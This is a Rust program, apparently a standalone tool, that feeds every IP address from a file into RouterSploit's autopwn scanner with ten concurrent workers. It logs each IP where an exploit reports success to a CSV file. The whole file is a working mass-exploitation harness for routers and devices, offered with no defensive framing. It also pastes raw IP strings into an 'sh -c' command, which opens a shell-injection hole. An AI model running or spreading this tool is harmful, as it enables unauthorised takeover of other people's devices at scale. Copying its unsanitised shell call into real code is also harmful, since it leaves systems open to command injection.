use std::fs::{File, OpenOptions};
use std::io::{self, Write, BufRead, BufReader};
use std::path::Path;
use std::process::Command;
use tokio::sync::Semaphore;
use tokio::task;
use futures::future::join_all;
use std::sync::Arc;
use std::error::Error;
use csv::WriterBuilder;
use serde::Serialize;

// Maximum number of concurrent tasks
const MAX_CONCURRENT_TASKS: usize = 10;

// Struct to hold CSV record data
#[derive(Serialize)]
struct ExploitRecord {
    ip_address: String,
    successful_exploit: String,
}

// Generate a unique filename if one already exists
fn generate_unique_filename(base_filename: &str) -> String {
    let mut counter = 1;
    let mut output_path = Path::new(base_filename).to_path_buf();

    while output_path.exists() {
        output_path = Path::new(&format!("{}_{}.csv", base_filename, counter)).to_path_buf();
        counter += 1;
    }

    output_path.to_string_lossy().to_string()
}

// Run routersploit autopwn command for a given IP
async fn run_routersploit(ip: &str) -> Result<Vec<String>, Box<dyn Error>> {
    println!("[INFO] Running routersploit autopwn on IP: {}", ip);

    let output = Command::new("sh")
        .arg("-c")
        .arg(format!("echo -e 'use scanners/autopwn\nset target {}\nrun\nexit\n' | python3 rsf.py", ip))
        .output()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let successful_exploits: Vec<String> = stdout
        .lines()
        .filter(|line| line.to_lowercase().contains("success"))
        .map(|line| line.split("success").last().unwrap_or("").trim().to_string())
        .collect();

    if !successful_exploits.is_empty() {
        println!("[SUCCESS] Exploits found for IP {}: {:?}", ip, successful_exploits);
    } else {
        println!("[INFO] No exploits found for IP {}", ip);
    }

    Ok(successful_exploits)
}

// Write results to CSV
fn append_to_csv(filename: &str, ip: &str, exploits: &[String]) -> Result<(), Box<dyn Error>> {
    let mut wtr = WriterBuilder::new().has_headers(false).from_writer(
        OpenOptions::new().append(true).create(true).open(filename)?,
    );

    for exploit in exploits {
        wtr.serialize(ExploitRecord {
            ip_address: ip.to_string(),
            successful_exploit: exploit.clone(),
        })?;
    }

    wtr.flush()?;
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Validate arguments
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 2 {
        eprintln!("Usage: {} <ip_list_file.txt>", args[0]);
        std::process::exit(1);
    }

    let ip_list_file = &args[1];

    // Load IPs from file
    let file = File::open(ip_list_file)?;
    let reader = BufReader::new(file);
    let ips: Vec<String> = reader.lines().filter_map(Result::ok).collect();
    println!("[INFO] Loaded {} IPs from {}", ips.len(), ip_list_file);

    // Generate a unique output CSV filename
    let output_csv = generate_unique_filename("routersploit_results.csv");

    // Initialize CSV file with headers
    let mut wtr = csv::Writer::from_path(&output_csv)?;
    wtr.write_record(&["IP Address", "Successful Exploit"])?;
    wtr.flush()?;
    println!("[INFO] Created CSV file with headers: {}", output_csv);

    // Set up semaphore to limit concurrency
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_TASKS));

    // Process each IP concurrently, limited by semaphore
    let tasks: Vec<_> = ips.into_iter().map(|ip| {
        let ip = ip.clone();
        let output_csv = output_csv.clone();
        let semaphore = semaphore.clone();

        task::spawn(async move {
            let _permit = semaphore.acquire().await.unwrap();
            match run_routersploit(&ip).await {
                Ok(successful_exploits) => {
                    if !successful_exploits.is_empty() {
                        append_to_csv(&output_csv, &ip, &successful_exploits).unwrap();
                        println!("[SUCCESS] Appended exploits for IP {} to CSV", ip);
                    }
                }
                Err(e) => eprintln!("[ERROR] Error processing IP {}: {}", ip, e),
            }
        })
    }).collect();

    // Await all tasks
    join_all(tasks).await;

    println!("[INFO] Autopwn complete for all IPs. Results appended in {}", output_csv);
    Ok(())
}
